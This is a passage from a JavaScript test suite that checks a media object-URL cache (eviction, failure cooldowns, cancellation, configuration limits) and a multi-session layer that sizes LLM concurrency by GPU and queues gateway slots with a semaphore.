  assert(await replacementLoad, 'the replacement owner must complete');
  assertEqual(harness.cache.stats().failed, 0);
});

await testAsync('media failure cache enforces LRU bounds without sliding expiry', async () => {
  const targets = ['a.png', 'b.png', 'c.png'].map(
    filename => `/api/media/output?id=lru&filename=${filename}`,
  );
  const attempts = new Map();
  const harness = createObjectUrlCacheTestHarness({
    maxFailures: 2,
    fetchImpl: async target => {
      attempts.set(target, (attempts.get(target) || 0) + 1);
      return { ok: false, status: 503 };
    },
  });

  await harness.cache.load(targets[0]);
  await harness.cache.load(targets[1]);
  await harness.cache.load(targets[0]);
  await harness.cache.load(targets[2]);
  assertEqual(harness.cache.stats().failed, 2);
  await harness.cache.load(targets[0]);
  await harness.cache.load(targets[2]);
  assertEqual(attempts.get(targets[0]), 1, 'recent failure A remains cached');
  assertEqual(attempts.get(targets[2]), 1, 'new failure C remains cached');
  await harness.cache.load(targets[1]);
  assertEqual(attempts.get(targets[1]), 2, 'oldest failure B must be evicted');
  assertEqual(harness.cache.stats().failed, 2);
});

await testAsync('media failure metadata expires lazily without a retry', async () => {
  const target = '/api/media/output?id=expired&filename=stale.png';
  let now = 0;
  const harness = createObjectUrlCacheTestHarness({
    now: () => now,
    fetchImpl: async () => ({ ok: false, status: 503 }),
  });

  assertEqual(await harness.cache.load(target), null);
  assertEqual(harness.cache.stats().failed, 1);
  now = 60_000;
  assertEqual(harness.cache.stats().failed, 0);
  assertEqual(harness.cache.clear(), 0);
});

await testAsync('media eviction revoke errors do not poison an inserted URL', async () => {
  const firstTarget = '/api/media/output?id=revoke&filename=first.png';
  const secondTarget = '/api/media/output?id=revoke&filename=second.png';
  let firstUrl = null;
  const harness = createObjectUrlCacheTestHarness({
    maxEntries: 1,
    revokeObjectURL: objectUrl => {
      if (objectUrl === firstUrl) throw new Error('revoke failed');
    },
  });

  firstUrl = await harness.cache.load(firstTarget);
  await harness.cache.load(secondTarget);
  assertEqual(harness.cache.peek(firstTarget), null);
  assert(harness.cache.peek(secondTarget), 'new URL remains owned after old revoke fails');
  assertEqual(harness.cache.stats().failed, 0);
});

await testAsync('media invalidation retain and clear remove failure cooldowns exactly', async () => {
  const keepTarget = '/api/media/output?id=failed&filename=keep.png';
  const retryTarget = '/api/media/output?id=failed&filename=retry.png';
  const dropTarget = '/api/media/output?id=failed&filename=drop.png';
  const attempts = new Map();
  const harness = createObjectUrlCacheTestHarness({
    fetchImpl: async target => {
      attempts.set(target, (attempts.get(target) || 0) + 1);
      return { ok: false, status: 503 };
    },
  });

  await harness.cache.load(keepTarget);
  await harness.cache.load(retryTarget);
  await harness.cache.load(dropTarget);
  assertEqual(harness.cache.stats().failed, 3);
  assertEqual(harness.cache.invalidate(retryTarget), true);
  await harness.cache.load(retryTarget);
  assertEqual(attempts.get(retryTarget), 2, 'explicit invalidation permits immediate retry');
  assertEqual(harness.cache.retain([keepTarget]), 2);
  assertEqual(harness.cache.stats().failed, 1);
  assertEqual(harness.cache.clear(), 1);
  assertEqual(harness.cache.stats().failed, 0);
});

test('media failure cache rejects unbounded or invalid configuration', () => {
  const base = {
    fetchImpl: async () => ({ ok: false, status: 503 }),
    createObjectURL: () => 'blob:test',
    revokeObjectURL: () => {},
  };
  assertThrows(() => createLegacyLocalObjectUrlCache({ ...base, maxFailures: 0 }));
  assertThrows(() => createLegacyLocalObjectUrlCache({ ...base, maxFailures: 257 }));
  assertThrows(() => createLegacyLocalObjectUrlCache({ ...base, failureTtlMs: 0 }));
  assertThrows(() => createLegacyLocalObjectUrlCache({ ...base, failureTtlMs: 3_600_001 }));
  assertThrows(() => createLegacyLocalObjectUrlCache({ ...base, now: 1 }));
  const invalidClock = createLegacyLocalObjectUrlCache({ ...base, now: () => NaN });
  assertThrows(() => invalidClock.stats());
});

await testAsync('media object URL cache enforces its completed-entry LRU bound', async () => {
  const harness = createObjectUrlCacheTestHarness({ maxEntries: 2 });
  const firstTarget = '/api/media/output?id=3&filename=first.png';
  const secondTarget = '/api/media/output?id=3&filename=second.png';
  const thirdTarget = '/api/media/output?id=3&filename=third.png';
  const firstUrl = await harness.cache.load(firstTarget);
  const secondUrl = await harness.cache.load(secondTarget);

  assertEqual(harness.cache.peek(firstTarget), firstUrl, 'peek must refresh LRU ownership');
  const thirdUrl = await harness.cache.load(thirdTarget);

  assertEqual(harness.cache.stats().completed, 2);
  assertEqual(harness.cache.peek(firstTarget), firstUrl);
  assertEqual(harness.cache.peek(secondTarget), null);
  assertEqual(harness.cache.peek(thirdTarget), thirdUrl);
  assertEqual(harness.revoked.length, 1);
  assertEqual(harness.revoked[0], secondUrl);
});

await testAsync('media object URL cache cancels the oldest load at its pending bound', async () => {
  const firstTarget = '/api/media/output?id=3&filename=pending-first.png';
  const secondTarget = '/api/media/output?id=3&filename=pending-second.png';
  const requests = [];
  const harness = createObjectUrlCacheTestHarness({
    maxPending: 1,
    fetchImpl: (target, options) => new Promise(resolve => {
      requests.push({ resolve, signal: options.signal, target });
    }),
  });

  const firstLoad = harness.cache.load(firstTarget);
  await Promise.resolve();
  assertEqual(requests.length, 1);
  const secondLoad = harness.cache.load(secondTarget);
  assertEqual(requests[0].signal.aborted, true);
  await Promise.resolve();
  assertEqual(requests.length, 2);
  assertEqual(harness.cache.stats().pending, 1);

  requests[0].resolve({
    ok: true,
    blob: async () => ({ target: firstTarget }),
  });
  requests[1].resolve({
    ok: true,
    blob: async () => ({ target: secondTarget }),
  });
  assertEqual(await firstLoad, null);
  const secondUrl = await secondLoad;
  assert(secondUrl, 'newest pending load must complete');
  assertEqual(harness.cache.peek(firstTarget), null);
  assertEqual(harness.cache.peek(secondTarget), secondUrl);
  assertEqual(harness.created.length, 1);
  assertEqual(harness.cache.stats().pending, 0);
});

await testAsync('media retain and clear revoke completed URLs and cancel pending URLs', async () => {
  const keepTarget = '/api/media/output?id=4&filename=keep.png';
  const dropTarget = '/api/media/output?id=4&filename=drop.png';
  const pendingTarget = '/api/media/output?id=4&filename=pending.png';
  let resolvePending;
  let pendingSignal = null;
  const harness = createObjectUrlCacheTestHarness({
    fetchImpl: (target, options) => {
      if (target === pendingTarget) {
        pendingSignal = options.signal;
        return new Promise(resolve => {
          resolvePending = resolve;
        });
      }
      return Promise.resolve({
        ok: true,
        blob: async () => ({ target }),
      });
    },
  });
  const keepUrl = await harness.cache.load(keepTarget);
  const dropUrl = await harness.cache.load(dropTarget);
  const pendingLoad = harness.cache.load(pendingTarget);
  await Promise.resolve();

  assertEqual(harness.cache.retain([keepTarget]), 2);
  assertEqual(pendingSignal.aborted, true);
  assert(harness.revoked.includes(dropUrl), 'retain must revoke a completed dropped URL');
  resolvePending({
    ok: true,
    blob: async () => ({ target: pendingTarget }),
  });
  assertEqual(await pendingLoad, null);
  assertEqual(harness.cache.peek(pendingTarget), null);
  assertEqual(harness.cache.clear(), 1);
  assert(harness.revoked.includes(keepUrl), 'clear must revoke the retained URL');
  assertEqual(harness.cache.stats().completed, 0);
  assertEqual(harness.cache.stats().pending, 0);
  assertThrows(
    () => harness.cache.retain(keepTarget),
    'retain must reject a string instead of treating it as characters',
  );
});

test('C3_READY stdout format', () => {
  // The server prints C3_READY:<port> — verify the format
  const port = 12345;
  const readyLine = `C3_READY:${port}`;
  assert(readyLine.startsWith('C3_READY:'), 'should start with C3_READY:');
  const parsed = parseInt(readyLine.split(':')[1], 10);
  assertEqual(parsed, 12345, 'should parse port number from ready line');
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 9: Multi-Session Infrastructure (v125)
// ═══════════════════════════════════════════════════════════════════════════════

import { computeSessionCapacity } from '../src/system/gpu-detector.js';
import { llmGateway } from '../src/llm/gateway.js';

suite('Multi-Session Infrastructure — config + semaphore + capacity');

test('config.sessions exists with defaults', () => {
  assert(config.sessions, 'sessions config should exist');
  assertEqual(config.sessions.maxConcurrentLLM, 1, 'default maxConcurrentLLM should be 1');
  assert(config.sessions.llmQueueTimeout > 0, 'llmQueueTimeout should be positive');
  assertEqual(config.sessions.gpuAutoScale, false, 'gpuAutoScale should default to false');
});

test('config.providers exists with ollama default', () => {
  assert(config.providers, 'providers config should exist');
  assertEqual(config.providers.active, 'ollama', 'active provider should be ollama');
});

test('computeSessionCapacity — single dedicated GPU', () => {
  const profile = {
    gpus: [{ gpu_model: 'RTX 3090', vram_mb: 24576, is_igpu: false }],
    platform: 'linux', cpu: 'test', ram_gb: 32,
  };
  const cap = computeSessionCapacity(profile);
  assertEqual(cap.maxConcurrentLLM, 1);
  assertEqual(cap.dedicatedGPUs, 1);
  assertEqual(cap.totalVramMb, 24576);
  assert(cap.reason.includes('1 dedicated GPU'), `reason: ${cap.reason}`);
});

test('computeSessionCapacity — two dedicated GPUs', () => {
  const profile = {
    gpus: [
      { gpu_model: 'RTX 3090', vram_mb: 24576, is_igpu: false },
      { gpu_model: 'RTX 4090', vram_mb: 24576, is_igpu: false },
    ],
    platform: 'linux', cpu: 'test', ram_gb: 64,
  };
  const cap = computeSessionCapacity(profile);
  assertEqual(cap.maxConcurrentLLM, 2);
  assertEqual(cap.dedicatedGPUs, 2);
  assertEqual(cap.totalVramMb, 49152);
  assert(cap.reason.includes('2 dedicated GPUs'), `reason: ${cap.reason}`);
});

test('computeSessionCapacity — iGPU only (no dedicated)', () => {
  const profile = {
    gpus: [{ gpu_model: 'Intel UHD 770', vram_mb: 2048, is_igpu: true }],
    platform: 'linux', cpu: 'test', ram_gb: 16,
  };
  const cap = computeSessionCapacity(profile);
  assertEqual(cap.maxConcurrentLLM, 1);
  assertEqual(cap.dedicatedGPUs, 0);
  assert(cap.reason.includes('CPU-only'), `reason: ${cap.reason}`);
});

test('computeSessionCapacity — small GPU excluded (< 6GB)', () => {
  const profile = {
    gpus: [{ gpu_model: 'GTX 1050', vram_mb: 4096, is_igpu: false }],
    platform: 'linux', cpu: 'test', ram_gb: 16,
  };
  const cap = computeSessionCapacity(profile);
  assertEqual(cap.maxConcurrentLLM, 1);
  assertEqual(cap.dedicatedGPUs, 0, 'GPU with < 6GB should not count');
});

test('computeSessionCapacity — mixed GPUs (dedicated + iGPU)', () => {
  const profile = {
    gpus: [
      { gpu_model: 'RTX 3090', vram_mb: 24576, is_igpu: false },
      { gpu_model: 'Intel UHD 770', vram_mb: 2048, is_igpu: true },
    ],
    platform: 'linux', cpu: 'test', ram_gb: 32,
  };
  const cap = computeSessionCapacity(profile);
  assertEqual(cap.maxConcurrentLLM, 1, 'only dedicated GPU counts');
  assertEqual(cap.dedicatedGPUs, 1);
});

test('LLM gateway concurrency stats', () => {
  const stats = llmGateway.getConcurrencyStats();
  assert(typeof stats.max === 'number', 'max should be number');
  assert(typeof stats.active === 'number', 'active should be number');
  assert(typeof stats.queued === 'number', 'queued should be number');
  assertEqual(stats.max, 1, 'default max should be 1');
});

test('LLM gateway getStats includes concurrency', () => {
  const stats = llmGateway.getStats();
  assert(stats.concurrency, 'stats should include concurrency');
  assertEqual(stats.concurrency.max, 1);
});

await testAsync('LLM semaphore acquire/release cycle', async () => {
  // Create a fresh gateway for testing
  const { LLMGateway } = await import('../src/llm/gateway.js');

  // Test direct semaphore behavior on singleton
  // Acquire a slot
  await llmGateway._acquireSlot();
  assertEqual(llmGateway._concurrency.active, 1, 'should have 1 active');

  // Release the slot
  llmGateway._releaseSlot();
  assertEqual(llmGateway._concurrency.active, 0, 'should have 0 active after release');
});

await testAsync('LLM semaphore queues when at max', async () => {
  // Acquire the only slot
  await llmGateway._acquireSlot();
  assertEqual(llmGateway._concurrency.active, 1);

  // Second acquire should queue
  let resolved = false;
  const p = llmGateway._acquireSlot().then(() => { resolved = true; });

  // Should be queued, not resolved yet
  assertEqual(llmGateway._concurrency.queue.length, 1, 'should have 1 queued');
  assertEqual(resolved, false, 'should not be resolved yet');

  // Release first slot — should grant to queued
  llmGateway._releaseSlot();
  await p;
  assertEqual(resolved, true, 'queued caller should now be resolved');
  assertEqual(llmGateway._concurrency.active, 1, 'active should still be 1 (transferred)');

  // Cleanup
  llmGateway._releaseSlot();
  assertEqual(llmGateway._concurrency.active, 0);
});

await testAsync('LLM semaphore release when nothing queued', async () => {
  // Release with nothing active — should clamp to 0
  llmGateway._releaseSlot();
  assertEqual(llmGateway._concurrency.active, 0, 'should not go negative');
});

// ═══════════════════════════════════════════════════════════════════════════════

summary();
